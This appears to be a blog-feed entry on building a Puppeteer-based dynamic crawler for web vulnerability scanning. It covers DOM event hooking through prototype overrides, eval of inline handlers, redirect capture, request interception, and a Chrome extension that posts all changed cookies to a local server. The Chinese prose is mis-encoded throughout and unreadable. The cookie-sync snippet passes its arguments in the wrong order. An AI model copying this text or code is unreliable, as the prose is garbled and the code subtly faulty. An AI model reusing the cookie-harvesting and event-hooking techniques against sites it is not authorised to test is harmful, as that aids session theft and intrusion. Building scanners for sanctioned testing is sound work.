Âú®ÂéªÂπ¥ÁöÑÊó∂ÂÄôÔºåÂ∞ùËØïËøáÁî®PyppeteerÂÜôËøáÂä®ÊÄÅÁà¨Ëô´ÔºåPythonÁâàÁî±‰∫éÊòØÁ¨¨‰∏âÊñπ‰∏Ä‰∏™‰ΩúËÄÖÂ∞ÅË£ÖÁöÑÔºåÊõ¥Êñ∞ÂæàÊÖ¢ÔºåËêΩÂêéÂÆòÊñπÁâàÊú¨ÂæàÂ§öÔºåÂæàÂ§öËø∑‰πãBUGÔºåÊØîÂ¶ÇCDPÂçèËÆÆÂéªÊìç‰ΩúËøúÁ®ãchromiumÔºåÂæàÂÆπÊòì‰∏≠Êñ≠ÂØºËá¥‰∏ÄÂ†ÜÂÉµÂ∞∏ËøõÁ®ãÁöÑchromiumÂÖ≥‰∏çÊéâ„ÄÇËôΩÁÑ∂ÊúÄÂêéËøòÊòØÈ°∂ÁùÄÂêÑÁßçbugÔºåÂÜôÊàê‰∏Ä‰∏™ÂãâÂº∫ËÉΩÁî®ÁöÑÂ∑•ÂÖ∑Ôºå‰ΩÜÂú®ÊúçÂä°Âô®‰∏äÂæàÂêÉÂÜÖÂ≠òÔºå‰∏ÄÊñπÈù¢‰πüÊòØÂõ†‰∏∫ÂÜôÁöÑ‰ªªÂä°Ë∞ÉÂ∫¶Êú∫Âà∂‰πüÊúâ‰∏Ä‰∫õÈóÆÈ¢òÔºåÊúÄÂêéÊúçÂΩπ‰∫ÜËÆ∏Â§öÂ§©Â§©Ôºå‰∏çÊÉ≥Áª¥Êä§‰∫ÜÔºåÊç°‰∫ÜÂá†‰∏™ÊºèÊ¥ûÂ∞±ÈÄÄ‰ºë‰∫Ü„ÄÇÂêéÊù•Âú®Âπ≥Êó∂ÁöÑÂ∑•‰ΩúÂíåÂ≠¶‰π†‰∏≠È¢ëÈ¢ëÊé•Ëß¶Âà∞nodeJSÔºå‰∫éÊòØÂ∞±Ë∂ÅÁùÄËøôÊÆµÊó∂Èó¥Áî®nodejsÈáçÊñ∞ÂÆûÁé∞‰∏ÄÈÅç„ÄÇ JSÂü∫Á°ÄJS‰∏≠ÁöÑ‰∫ã‰ª∂Ê®°ÂûãÂàÜ‰∏∫ÔºöÂÜÖËÅî„ÄÅDOM0Á∫ß„ÄÅDOM2Á∫ß‰∫ã‰ª∂ JSÂéüÂûãÈìæ‰ªãÁªçJsÊòØ‰∏ÄÁßçÂü∫‰∫éÂéüÂûãÁöÑËØ≠Ë®ÄÔºåÊØè‰∏Ä‰∏™ÂØπË±°ÈÉΩÊúâ‰∏Ä‰∏™ÂéüÂûãÂØπË±°ÔºåÂØπË±°‰ª•ÂÖ∂ÂéüÂûã‰∏∫Ê®°Êùø„ÄÅ‰ªéÂéüÂûãÁªßÊâøÊñπÊ≥ïÂíåÂ±ûÊÄß„ÄÇÂéüÂûãÂØπË±°‰πüÂèØËÉΩÊã•ÊúâÂéüÂûãÔºå‰∏ÄÂ±Ç‰∏ÄÂ±Ç„ÄÅ‰ª•Ê≠§Á±ªÊé®„ÄÇÂú®‰º†ÁªüÁöÑÈù¢ÂêëÂØπË±°ÁºñÁ®ã‰∏≠ÔºåÊàë‰ª¨È¶ñÂÖà‰ºöÂÆö‰πâ‚ÄúÁ±ª‚ÄùÔºåÊ≠§ÂêéÂàõÂª∫ÂØπË±°ÂÆû‰æãÊó∂ÔºåÁ±ª‰∏≠ÂÆö‰πâÁöÑÊâÄÊúâÂ±ûÊÄßÂíåÊñπÊ≥ïÈÉΩË¢´Â§çÂà∂Âà∞ÂÆû‰æã‰∏≠„ÄÇ‰ΩÜÂú® js ‰∏≠Âπ∂‰∏çÊòØÂÉèËøôÊ†∑Â§çÂà∂ÔºåËÄåÊòØÂú®ÂØπË±°ÂÆû‰æãÂíåÁ±ª‰πãÈó¥‰πãÈó¥Âª∫Á´ã‰∏Ä‰∏™ÈìæÊé•„ÄÇdemo:12345function Cat() &#123; this.color = 'test'&#125;var cat = new Cat()console.log(cat.__proto__ === Cat.prototype) // true Âú® JavaScript ‰∏≠ÔºåÂ¶ÇÊûúÊÉ≥ËÆøÈóÆÊüê‰∏™Â±ûÊÄßÔºåÈ¶ñÂÖà‰ºöÂú®ÂÆû‰æãÂØπË±°ÔºàcatÔºâÁöÑÂÜÖÈÉ®ÂØªÊâæÔºåÂ¶ÇÊûúÊ≤°ÊâæÂà∞ÔºåÂ∞±‰ºöÂú®ËØ•ÂØπË±°ÁöÑÂéüÂûãÔºàcat._proto_ÔºåÂç≥ Cat.prototypeÔºâ‰∏äÊâæÔºåÊàë‰ª¨Áü•ÈÅìÔºåÂØπË±°ÁöÑÂéüÂûã‰πüÊòØÂØπË±°ÔºåÂÆÉ‰πüÊúâÂéüÂûãÔºåÂ¶ÇÊûúÂú®ÂØπË±°ÁöÑÂéüÂûã‰∏ä‰πüÊ≤°ÊúâÊâæÂà∞ÁõÆÊ†áÂ±ûÊÄßÔºåÂàô‰ºöÂú®ÂØπË±°ÁöÑÂéüÂûãÁöÑÂéüÂûãÔºàCat.prototype._proto_Ôºâ‰∏äÂØªÊâæÔºå‰ª•Ê≠§ÂÜÖÊé®ÔºåÁõ¥Âà∞ÊâæÂà∞Ëøô‰∏™Â±ûÊÄßÊàñËÄÖÂà∞Ëææ‰∫ÜÊúÄÈ°∂Â±Ç„ÄÇÂú®ÂéüÂûã‰∏ä‰∏ÄÂ±Ç‰∏ÄÂ±ÇÂØªÊâæÔºåËøô‰æøÊòØÂéüÂûãÈìæ‰∫Ü„ÄÇ Â¶Ç‰ΩïÊäìÂèñÊõ¥Â§öÁöÑURLÂá†ÁßçÊÄùË∑ØÔºåÂèØ‰ª•Áõ¥Êé•‰ΩøÁî®Ê≠£ÂàôÊäìÂèñÔºå‰πüÂèØ‰ª•Ëß£ÊûêÂêÑÁßçÂê´ÊúâÈìæÊé•ÁöÑÊ†áÁ≠æÔºå‰πüÂ∞±ÊòØsrc,hrefÂ±ûÊÄßÁ≠â„ÄÇÂΩìÁÑ∂Ëøô‰∫õÈÉΩÊúâ‰∏ÄÂÆöÁöÑÁº∫Èô∑ÔºåÊØîÂ¶ÇÁõ∏ÂØπË∑ØÂæÑÈúÄË¶ÅÂçïÁã¨ÂéªÂ§ÑÁêÜÊàêÂÆåÊï¥URlÔºåÊúâÁöÑ‰ΩøÁî®ÁöÑjsË∑≥ËΩ¨ÔºåËÄå‰∏çÊääURlÂÜôÂà∞Ê†áÁ≠æÂÜÖÁ≠âÁ≠â„ÄÇÂè¶‰∏ÄÁßçÊÄùË∑ØÂç≥‰ΩøÁî®Âä®ÊÄÅÁà¨Ëô´ÁöÑÊÄùË∑ØÔºåHook JSÔºåÈÄöËøáËß¶ÂèëÂêÑÁßç‰∫ã‰ª∂‰ø°ÊÅØÊî∂ÈõÜURL„ÄÇËøôÈáåËÆ°ÂàíÁ¨¨‰∏ÄÁâàÁà¨Ëô´ÂÖàÂÆûÁé∞ÁÆÄÊòìÁöÑURLÊäìÂèñÔºå‰πãÂêéÂÜçËøõ‰∏ÄÊ≠•‰ºòÂåñ„ÄÇÈ¶ñÂÖàÊúÄÂ∏∏ÊÉ≥Âà∞ÁöÑÊòØ‰ΩøÁî®Ê≠£ÂàôÊäìÂèñÔºåÂÖ∂Ê¨°ÂèØ‰ª•Âà©Áî®HeadlessÁöÑ‰ºòÂäøÔºåÂ∞ÜÂä®ÊÄÅJSÊ∏≤ÊüìÁöÑÈìæÊé•Ê†áÁ≠æ„ÄÅÂ±ûÊÄßÊäìÂèñ„ÄÇ Êî∂ÈõÜsrc„ÄÅhrefÂ±ûÊÄßÁöÑÊ†áÁ≠æ12345678910111213141516171819function getSrcAndHrefLinks(nodes) &#123; let result = []; for(let node of nodes)&#123; let src = node.getAttribute(&quot;src&quot;); let href = node.getAttribute(&quot;href&quot;); let action = node.getAttribute(&quot;action&quot;); if (src)&#123; result.push(src) &#125; if (href)&#123; result.push(href); &#125; if(action)&#123; result.push(action); &#125; &#125; return result;&#125;const links = await page.$$eval(&apos;[src],[href],[action]&apos;, getSrcAndHrefLinks); Áà¨Ë°åÁªìÊûúÔºö Êé•ÁùÄÈÄöËøáÁÆÄÂçïÁöÑURLÂéªÈáç„ÄÅÊ∏ÖÊ¥óÔºåÁà¨Ëô´‰æøÂèØ‰ª•ËøõË°åËø≠‰ª£Áà¨Ë°å‰∫Ü„ÄÇ ÁªèËøá‰∏ÄÁï™ÊµãËØïÂêéÂèëÁé∞ÔºåÂØπ‰∫é‰∏ãÈù¢ËøôÁßçÈ°µÈù¢URLÊäìÂèñÊòØ‰ºöÊúâÈÅóÊºèÁöÑÔºö ÊúâÁöÑÂ∞ÜË∑≥ËΩ¨Êìç‰ΩúÂÖ®ÂÜôÂÖ•‰∫Üjs‰∫ã‰ª∂‰∏≠ÔºåÊàñËÄÖÊúâÁöÑË¶ÅËøõË°åÈ°µÈù¢ÊªöÂä®JSÊâç‰ºöËøõ‰∏ÄÊ≠•Ê∏≤ÊüìÔºåÊó†ÁñëÈÅóÊºè‰∫ÜÂæàÂ§öURL„ÄÇËß£ÂÜ≥Ëøô‰∫õÈóÆÈ¢òÁöÑÂÖ≥ÈîÆÂú®‰∫éÊ®°ÊãüÁî®Êà∑Êìç‰ΩúÔºåËÄåÁî®Êà∑Êìç‰ΩúÁöÑÊú¨Ë¥®Âàô‰∏∫Ëß¶ÂèëÂêÑÁßçDOM‰∫ã‰ª∂„ÄÇÊâÄ‰ª•Êé•‰∏ãÊù•ÈúÄË¶ÅËß£ÂÜ≥ÁöÑÈóÆÈ¢òÂú®‰∫éÊî∂ÈõÜÂêÑÁßçDOM‰∫ã‰ª∂Ôºå‰ª•ÂèäÂéªËß¶ÂèëÂÆÉ‰ª¨„ÄÇ Êî∂ÈõÜDOM‰∫ã‰ª∂Âú®Â≠¶‰π†Êî∂ÈõÜDOM‰∫ã‰ª∂ÁöÑËøáÁ®ã‰∏≠ÂèÇËÄÉ‰∫Ü9ian1iÂ∏àÂÇÖ‰ª•Âèäfate0Â∏àÂÇÖÊñáÁ´†ÔºåÂæàÊÑüË∞¢ÂâçËæà‰ª¨ÁöÑÊãìËçí„ÄÇ Hook‰∫ã‰ª∂Ê≥®ÂÜå‰∫ã‰ª∂ÂàÜ‰∏∫DOM0ÂíåDOM2‰∫ã‰ª∂Ôºå‰ΩøÁî®ÊñπÊ≥ï‰∏çÂêåÔºåÊî∂ÈõÜÊñπÊ≥ï‰πüÊúâÂ∑ÆÂºÇ„ÄÇËøôÈáåÁÆÄÂçï‰ªãÁªç‰∫Ü‰∏§ËÄÖÁöÑÂ∑ÆÂºÇDOM0Á∫ß‰∫ã‰ª∂ÂíåDOM2Á∫ß‰∫ã‰ª∂Âå∫Âà´„ÄÇ‰ª•ÂèäJavaScript Prototype Chain ÂéüÂûãÈìæÂ≠¶‰π†DOM0ÂØπ‰∫éDOM0ÁöÑ‰∫ã‰ª∂ÁõëÂê¨ÔºåÂèØ‰ª•‰øÆÊîπÊâÄÊúâËäÇÁÇπÁöÑÁõ∏ÂÖ≥Â±ûÊÄßÂéüÂûãÔºåËÆæÁΩÆÂÖ∂ËÆøÈóÆÂô®Â±ûÊÄß„ÄÇdemo:12345678910function dom0Hook(that, event_name) &#123; console.log("tagname: " + that.tagName + ", event_name:" + event_name);&#125;Object.defineProperties(HTMLElement.prototype, &#123; onclick: &#123;set: function(newValue)&#123;onclick = newValue;dom0Hook(this, "click");&#125;&#125;, onchange: &#123;set: function(newValue)&#123;onchange = newValue;dom0Hook(this, "change");&#125;&#125;&#125;); $0 = document.getElementsByTagName("a"); $0[0].onclick = function()&#123;console.log("a")&#125; DOM2DOM2Á∫ß‰∫ã‰ª∂HookÔºåÂèØ‰ª•ÈÄöËøá‰øÆÊîπaddEventListenerÁöÑÂéüÂûãÂç≥ÂèØÔºö12345let oldEvent = Element.prototype.addEventListener;Element.prototype.addEventListener = function(event_name, event_func, useCapture) &#123; console.log("tagname: " + this.tagName + ", event_name:" + event_name); oldEvent.apply(this, arguments);&#125;; ÂÜÖËÅî‰∫ã‰ª∂Èô§‰∫Ü‰∏äËø∞‰∏§ÁßçÁªëÂÆö‰∫ã‰ª∂ÁöÑÂäûÊ≥ïÔºåËøòÊúâÈÄöËøáÂÜôÂú®Ê†áÁ≠æÂÜÖÁöÑÂÜÖËÅî‰∫ã‰ª∂ÔºåÊó†Ê≥ïÈÄöËøáHookÊù•Êî∂ÈõÜ„ÄÇÊØîÂ¶ÇÔºö1&lt;div id="test" onclick="alert('1')"&gt;123&lt;/div&gt; Ëß£ÂÜ≥ÂäûÊ≥ïÊòØÈÄöËøáÈÅçÂéÜËäÇÁÇπÔºåÊâßË°åon‰∫ã‰ª∂Ôºö123456789101112131415161718function trigger_inline()&#123; var nodes = document.all; for (var i = 0; i &lt; nodes.length; i++) &#123; var attrs = nodes[i].attributes; for (var j = 0; j &lt; attrs.length; j++) &#123; attr_name = attrs[j].nodeName; attr_value = attrs[j].nodeValue; if (attr_name.substr(0, 2) == "on") &#123; console.log(attrs[j].nodeName + ' : ' + attr_value); eval(attr_value); &#125; if (attr_name in &#123;"src": 1, "href": 1&#125; &amp;&amp; attrs[j].nodeValue.substr(0, 11) == "javascript:") &#123; console.log(attrs[j].nodeName + ' : ' + attr_value); eval(attr_value.substr(11)); &#125; &#125; &#125;&#125; ÊàñËÄÖTreeWalkerËé∑ÂèñÂÖ®ÈÉ®ËäÇÁÇπÔºåÁî®dispatchEventÊå®‰∏™Ëß¶Âèë‰∫ã‰ª∂ËÄåDOM0„ÄÅDOM2Á∫ß‰∫ã‰ª∂ÈÄöËøáÊî∂ÈõÜÂà∞ÁöÑÊ†áÁ≠æÂíå‰∫ã‰ª∂Âêç‰æùÊ¨°Ëß¶ÂèëÂç≥ÂèØ„ÄÇ ÂØºËà™ÈîÅÂÆöËß¶Âèë‰∫ã‰ª∂ÁöÑËøáÁ®ã‰∏≠ÔºåÂèØËÉΩ‰ºöË¢´ÊÑèÂ§ñÁöÑÂØºËà™ËØ∑Ê±ÇÁªô‰∏≠Êñ≠Êìç‰ΩúÔºåÊâÄ‰ª•Êàë‰ª¨Â∫îÂΩìÂèñÊ∂àÈùûÊú¨È°µÈù¢ÁöÑÂØºËà™ËØ∑Ê±ÇÔºåÈÅøÂÖçÈÄ†ÊàêÊºèÊäì„ÄÇÂâçÁ´ØJSË∑≥ËΩ¨ÂèñÊ∂àË∑≥ËΩ¨Êìç‰ΩúÔºåËÆ∞ÂΩïË∑≥ËΩ¨URLÔºå‰ΩÜÊòØChrome‰∏çÂÖÅËÆ∏Êàë‰ª¨ÈÄöËøáObject.definePropertyÈáçÂÆö‰πâwindow.LocationÊìç‰ΩúÔºåÂç≥Êó†Ê≥ïÈÄöËøáHookËé∑ÂèñË∑≥ËΩ¨ÁöÑURL„ÄÇ ÊêúÁ¥¢‰∫Ü‰∏Ä‰∫õËµÑÊñô‰πãÂêéÂ§ßËá¥Êúâ‰∏ãËæπ‰∏Ä‰∫õËß£ÂÜ≥ÂäûÊ≥ïÔºö ‰øÆÊîπChromiumÈªòËÆ§locationÂ±ûÊÄßÁöÑconfigurable‰∏∫true Âä†ËΩΩËá™ÂÆö‰πâÊèí‰ª∂ ‰ΩøÁî®puppeteerÁöÑÊã¶Êà™Âô®ËøîÂõû204Áä∂ÊÄÅÁ†Å ‰ΩÜÊúÄÂêéÊàëÈÄâÊã©‰∫Ü‰∏∫ÊºèÊâ´Âä®ÊÄÅÁà¨Ëô´ÂÆöÂà∂ÁöÑÊµèËßàÂô®ÔºåÂêéËæπ‰ºöÁªÜËØ¥„ÄÇ ÂêéÁ´ØË∑≥ËΩ¨ËØ∑Ê±Ç‰ΩìÊó†ÂÜÖÂÆπÔºåÂàôË∑üËøõÔºõËØ∑Ê±Ç‰ΩìÊúâÂÜÖÂÆπÔºåÂàôÊ∏≤ÊüìÈ°µÈù¢ÔºåËÆ∞ÂΩïË∑≥ËΩ¨url„ÄÇ Ë°®ÂçïÂ°´ÂÖÖÈîÅÂÆöÈáçÁΩÆË°®Âçï‰∫ã‰ª∂12345HTMLFormElement.prototype.reset = function() &#123; console.log("cancel reset form")&#125;;Object.defineProperty(HTMLFormElement.prototype, "reset", &#123;"writable": false, "configurable": false&#125;); ÊåñÂùë ‰∏∫ÊºèÊâ´Âä®ÊÄÅÁà¨Ëô´ÂÆöÂà∂ÁöÑÊµèËßàÂô®Ëß£ÂÜ≥Ëøô‰∏™ÂâçÁ´ØÂØºËà™hookÈóÆÈ¢òÁöÑÊó∂ÂÄôÔºåÂèëÁé∞github‰∏äÊúâ‰∏Ä‰∏™Â§ßÁâõÈÄöËøá‰øÆÊîπÊ∫êÁ†ÅÂÆûÁé∞‰∫Ü‰∏Ä‰∏™‰∏∫ÊºèÊâ´ÂÆöÂà∂ÁâàÁöÑChrome„ÄÇ‰ΩúËÄÖÈÄöËøá‰øÆÊîπchromiumÊ∫êÁ†ÅÂÆûÁé∞‰∫ÜÂØºËà™ÁöÑHookÔºåÁ¶ÅÊ≠¢È°µÈù¢ÁöÑÂ§©ÈîªË∑≥ËΩ¨Âπ∂Êî∂ÈõÜÂÖ∂Ë∑≥ËΩ¨ÁöÑURLÔºåÂπ∂‰∏îÈÄöËøáÂ∫ïÂ±Çhook‰∫ÜÊâÄÊúâÈùûÈªòËÆ§‰∫ã‰ª∂Ôºå‰∏∫Êàë‰ª¨ÂºÄÂèëÊèê‰æõ‰∫ÜÂæàÂ§ö‰æøÂà©„ÄÇ ‰ΩÜËøòÊòØÊúâ‰∏Ä‰∫õÂ∞èÁöÑÂú∞ÊñπÈúÄË¶ÅÊàë‰ª¨Ëá™Â∑±‰ºòÂåñ‰∏Ä‰∏ãÔºå‰ºöÈîÅÂÆöÂØºËà™Ëá™Âä®Êî∂ÈõÜÂâçÁ´ØË∑≥ËΩ¨URLÔºå‰ΩÜ‰∏ç‰ºöÂ§ÑÁêÜÂêéÁ´ØÁöÑLocationÔºåËøôÈáåÊàë‰ª¨Áî®‰∏Ä‰∏™Êã¶Êà™Âô®ÂéªÂÆûÁé∞ÔºåËÆ∞ÂΩïÂêéÁ´ØË∑≥ËΩ¨ÔºåÂä†ÂÖ•Êâ´ÊèèÈòüÂàóÔºö 12345678910await page.on('response', interceptedResponse =&gt;&#123; let status = interceptedResponse.status(); if(status.toString().substr(0,2) === "30")&#123; console.log("url: " + interceptedResponse.url()); console.log("status: " + status); console.log("headers: " + interceptedResponse.headers().location); // Ê∑ªÂä†Ëøõ‰ªªÂä°ÈòüÂàó cluster.queue(interceptedResponse.headers().location); &#125;&#125;); ‰∫ã‰ª∂Ëß¶Âèë&amp;Êî∂ÈõÜÁªìÊûú1234567891011121314151617181920212223function executeEvent() &#123; var firedEventNames = ["focus", "mouseover", "mousedown", "click", "error"]; var firedEvents = &#123;&#125;; var length = firedEventNames.length; for (let i = 0; i &lt; length; i++) &#123; firedEvents[firedEventNames[i]] = document.createEvent("HTMLEvents"); firedEvents[firedEventNames[i]].initEvent(firedEventNames[i], true, true); &#125; var eventLength = window.eventNames.length; for (let i = 0; i &lt; eventLength; i++) &#123; var eventName = window.eventNames[i].split("_-_")[0]; var eventNode = window.eventNodes[i]; var index = firedEventNames.indexOf(eventName); if (index &gt; -1) &#123; if (eventNode != undefined) &#123; eventNode.dispatchEvent(firedEvents[eventName]); &#125; &#125; &#125; let result = window.info.split("_-_"); result.splice(0,1); return result;&#125; Ê∑ªÂä†cookieÂØπ‰∫é‰ΩøÁî®SSOÂçïÁÇπÁ´ôÁÇπ‰ΩìÁ≥ªËÄåË®ÄÔºåÂèØ‰ª•Âú®ÂºÄÂßãÁà¨Ë°å‰πãÂâçÊåáÂÆö‰∏ÄÊÆµcookieÔºåÊØîÂ¶Ç‰ªéÊñáÊú¨‰∏≠ËØªÂèñ„ÄÇ‰ΩÜÊòØÂØπ‰∫éÁà¨Ë°åÁõÆÊ†áËæÉ‰∏∫Â§ö‰∏îSSOÁöÑË¶ÜÁõñÈù¢ÊúâÈôêÁöÑÊÉÖÂÜµ‰∏ãÔºåÂ∞±Âæó‰ΩøÁî®Êï∞ÊçÆÂ∫ì‰∫Ü„ÄÇÂú®ÊµãËØïËøáÁ®ã‰∏≠ÈÅáÂà∞‰∫ÜÂè¶‰∏Ä‰∏™ÈóÆÈ¢òÔºåÂ∞±ÊòØÂπ∂ÂèëËøáÈ´òÔºåÊàñËÄÖÂèëÈÄÅÊúâÂÆ≥ÁöÑpayloadÔºå‰ºöÊúâCookieÂ§±ÊïàÁöÑÈóÆÈ¢òÔºåËøôÈáåÊÉ≥Âà∞‰∫Ü‰∏ÄÁßçÊØîËæÉÂÆûÁî®ÁöÑËß£ÂÜ≥ÂäûÊ≥ïÔºåÂÜô‰∏Ä‰∏™ÊµèËßàÂô®Êèí‰ª∂ÂèäÊó∂Â∞ÜÂΩìÂâçÈ°µÈù¢ÁöÑcookieÂêåÊ≠•Âà∞ÊúçÂä°Á´ØÊï∞ÊçÆÂ∫ìÔºåÁÑ∂ÂêéÁà¨Ëô´ÂÆöÊúü‰ªéÊï∞ÊçÆÂ∫ì‰∏≠Êõ¥Êñ∞ÊúÄÊñ∞ÁöÑcookie„ÄÇ ChromeÊèí‰ª∂ÂêåÊ≠•cookie12345678910111213141516171819function updateCookie(domain, name , value)&#123; let api = "https://127.0.0.1/add-cookie"; $.post(api, &#123; "domain": domain, "name": name, "value": value, &#125;, function (data, status) &#123; console.log(status); &#125;);&#125;/* * doc: https://developer.chrome.com/extensions/cookies */chrome.cookies.onChanged.addListener((changeInfo) =&gt;&#123; // ËÆ∞ÂΩïCookieÂ¢ûÂä†ÔºåCookieÊõ¥Êñ∞ÂàÜ‰∏§Ê≠•ÔºåÁ¨¨‰∏ÄÊ≠•ÂÖàÂà†Èô§ÔºåÁ¨¨‰∫åÊ≠•ÂÜçÂ¢ûÂä† if(changeInfo.removed === false)&#123; updateCookie(changeInfo.cookie.name, changeInfo.cookie.value, changeInfo.cookie.domain); &#125;&#125;); Áõ∏‰ººURLÂéªÈáçÂéªÈáçÂú®Áà¨Ëô´‰∏≠ÊòØ‰∏Ä‰∏™ËæÉ‰∏∫Ê†∏ÂøÉÂäüËÉΩÔºåËßÑÂàôËøá‰∫éÂÆΩÊùæÂèØËÉΩÂØºËá¥Áà¨Ë°å‰∏çÂÆåÊàñËÄÖËØ¥ÂÅö‰∏Ä‰∫õÊó†ÊÑè‰πâÁöÑÈáçÂ§çÁà¨Ë°åÔºåËßÑÂàôËøá‰∫é‰∏•Ê†ºÂàôÂèØËÉΩÂØºËá¥ÊäìÂèñÁªìÊûúËøáÂ∞ëÔºåÂΩ±ÂìçÂêéÁª≠ÊäìÂèñÂíåÊºèÊ¥ûÊ£ÄÊµã„ÄÇÂéªÈáç‰∏ÄËà¨ÂàÜ‰∏∫‰∏§Ê≠•ÂØπÁà¨Ë°åÈòüÂàóÂéªÈáçÔºåÊàñËÄÖÂØπÁªìÊûúÈõÜÂéªÈáç„ÄÇ Âú®Ëß£ÂÜ≥Ëøô‰∏™ÈóÆÈ¢òÁöÑÊó∂ÂÄôÔºåÂèÇËÄÉ‰∫ÜFr1dayÂ∏àÂÇÖ„ÄêÊäÄÊúØÂàÜ‰∫´„ÄëÊµÖË∞àÂä®ÊÄÅÁà¨Ëô´‰∏éÂéªÈáçÁöÑURLÂéªÈáçÊÄùË∑Ø„ÄÇ‰∏çÂ§±‰∏∫‰∏ÄÁßçÊØîËæÉ‰æøÊç∑ÔºåËÉΩÂü∫Êú¨Êª°Ë∂≥ÂΩìÂâçÈúÄÊ±ÇÁöÑ‰∏ÄÁßçËß£ÂÜ≥ÂäûÊ≥ï„ÄÇ ÂèÇÊï∞ÂàÜÊûêÂ§ßËá¥Êúâ‰ª•‰∏ãÂá†ÁßçÂèÇÊï∞ÔºöÁ±ªÂûãint„ÄÅhash„ÄÅ‰∏≠Êñá„ÄÅURLÁºñÁ†Å1234?m=home&amp;c=index&amp;a=index?type=202cb962ac59075b964b07152d234b70?id=1?msg=%E6%B6%88%E6%81%AF Ê†πÊçÆ‰∏çÂêåÁöÑÁ±ªÂûãÂØπÂÖ∂ËøõË°åÂ§ÑÁêÜÔºö Á∫ØÂ≠óÊØçÔºö‰∏≠ÂèÇÊï∞ÁöÑÂÄºË°®Á§∫‰∏çÂêåÁöÑË∑ØÁî±ÂäüËÉΩÔºåÈúÄË¶ÅÂØπËøôÁßçÂèÇÊï∞ËøõË°å‰øùÁïô Â≠óÊØçÊï∞Â≠óÊ∑∑ÂêàÔºöÂèØËÉΩÊòØÁî®Êà∑ÁöÑhashÔºå‰πüÂèØËÉΩÂÖ∑ÊúâË∑ØÁî±ÂäüËÉΩÔºåÂèØÊ†πÊçÆ‰ªªÂä°ÈáèÊÉÖÂÜµÈÄâÊã©ÊÄß‰øùÁïô Á∫ØÊï∞Â≠ó„ÄÅURlÁºñÁ†ÅÔºöËøõË°åÂéªÈáç Â§ÑÁêÜÁªìÊûúÂç≥Ôºö1234?m=home&amp;c=index&amp;a=index?type=&#123;hash&#125;?id=&#123;int&#125;?msg=&#123;urlencode&#125; ÁÑ∂ÂêéÂú®Êï∞ÊçÆÂ∫ì‰∏≠Â∞ÜÁõ∏ÂêåÁöÑÊ∏ÖÊ¥óÊéâÂç≥ÂèØ„ÄÇ Áõ∏‰ººÈ°µÈù¢ÂéªÈáçÁõ∏‰ººÂ∫¶ËÆ°ÁÆóÔºåÁõëÊéßËµÑ‰∫ßÂèòÂåñÁΩëÈ°µÁªìÊûÑÁõ∏‰ººÂ∫¶:https://xueshu.baidu.com/usercenter/paper/show?paperid=232b0da253211ecf9e2c85cb513d0bd3&amp;site=xueshu_se ÊåñÂùë ÊÄßËÉΩ‰ºòÂåñÂõæÁâáËµÑÊ∫ê‰ºòÂåñÁ¶ÅÊ≠¢ÊµèËßàÂô®Âä†ËΩΩÂõæÁâá =&gt; ËøîÂõû‰∏Ä‰∏™fake imgÂÆûÈôÖÊµãËØïËøáÁ®ã‰∏≠ÔºåÊúâÁöÑÁΩëÁ´ôÂú®Âä†ËΩΩÂõæÁâáÂ§±Ë¥•ÂêéÔºå‰ºöÂ∞ùËØïÈáçÊñ∞Âä†ËΩΩÔºåËøôÊ†∑‰ºöÈô∑ÂÖ•‰∏Ä‰∏™Ê≠ªÂæ™ÁéØÔºåÂØºËá¥ÂèëÈÄÅÂ§ßÈáèÊï∞ÊçÆÂåÖÔºåÂç†Áî®ÊÄßËÉΩ„ÄÇ ‰ª£Á†ÅÔºö1234567891011121314151617const browser = await puppeteer.launch(launchOptions);const page = await browser.newPage();await preparePage(page);await page.setRequestInterception(true); // ÂºÄÂêØÊã¶Êà™ÂäüËÉΩawait page.on('request', interceptedRequest =&gt; &#123; // Êã¶Êà™ÂõæÁâáËØ∑Ê±Ç if (interceptedRequest.resourceType() === 'image' || interceptedRequest.url().endsWith('.ico')) &#123; //console.log(`abort image: $&#123;interceptedRequest.url()&#125;`); let images = fs.readFileSync('public/image.png'); interceptedRequest.respond(&#123; 'contentType': ' image/png', 'body': Buffer.from(images) &#125;); &#125; else &#123; interceptedRequest.continue(); &#125; Êã¶Êà™logoutËØ∑Ê±ÇÈÅøÂÖçÁà¨Ëô´Áà¨Ë°åÂà∞ÁôªÂá∫ÈìæÊé•ÔºåÂØºËá¥CookieÂ§±ÊïàÔºåËøôÈáåÂÅö‰∏Ä‰∏™ÁÆÄÂçïÁöÑÊã¶Êà™Ôºö12345678await page.on('request', interceptedRequest =&gt; &#123; if(interceptedRequest.url().indexOf("logout") !== -1)&#123; interceptedRequest.abort(); &#125; else&#123; interceptedRequest.continue(); &#125;&#125;); puppeteerÂπ∂ÂèëÂºÇÊ≠•Ë∞ÉÂ∫¶ÊñπÊ°àÁÆÄÂçïÁ≤óÊö¥ÔºåËøôÈáå‰ΩøÁî®puppeteer-clusterÂ∫ìËß£ÂÜ≥ÂçïChromeÂ§ötabÂπ∂ÂèëÈúÄÊ±ÇÔºå‰πüÂèØ‰ª•ÂèÇËÄÉ‰ΩøÁî®guimaiziÂ∏àÂÇÖÁöÑdemo:puppeteerÂºÇÊ≠•Âπ∂ÂèëÊñπÊ°à ÂºÄÊ∫êËøôÈáåËæπÂÖ∂ÂÆûËøòÊúâÂæàÂ§öÂùëË¶ÅÂ°´ÔºåÂ∏àÂÇÖ‰ª¨Â§öÊåáÁÇπ‰∫§ÊµÅ~ÂºÄÊ∫êÈìæÊé•Ôºöhttps://github.com/Passer6y/CrawlerVulnÔºàÊ±Çstar ÂæÖÂÆûÁé∞ÁöÑÈúÄÊ±ÇÂºπÁ™óÂèñÊ∂à ‰ª£Á†ÅÊ≥®ÂÖ•Êó∂Èó¥ÈìæÊé•Êî∂ÈõÜÊúâÁÇπ‰∏çÂ§™ÂÖ®ÔºåËß¶ÂèëÂÆå‰∫Ü‰∫ã‰ª∂ÂêéÂæóÁ≠â‰∏Ä‰ºöÂÜçÊî∂ÈõÜurl„ÄÇ ÂæÖËß£ÂÜ≥ÁöÑbugpage.once Á°ÆÂÆöÊäìÂèñÈìæÊé•Êó∂Èó¥]]></content>
      <tags>
        <tag>Code</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ECShop 2.x 3.0‰ª£Á†ÅÊâßË°åÊºèÊ¥ûÂàÜÊûê]]></title>
    <url>%2F2019%2F09%2F30%2FECShop%202.x%203.0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
